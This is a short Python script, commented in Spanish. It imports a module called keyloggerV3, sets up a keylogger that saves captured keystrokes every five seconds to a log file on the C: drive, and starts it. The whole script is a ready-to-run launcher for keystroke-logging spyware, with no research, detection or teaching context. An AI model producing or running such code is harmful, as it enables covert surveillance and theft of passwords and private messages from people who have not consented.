import keyloggerV3

# Crear una instancia de Keylogger con el intervalo y el archivo de log
my_keylogger = keyloggerV3.Keylogger(intervalo=5, archivo_log=r"C:\keylogger_files\log_teclas.txt")

# Iniciar el keylogger
my_keylogger.start()
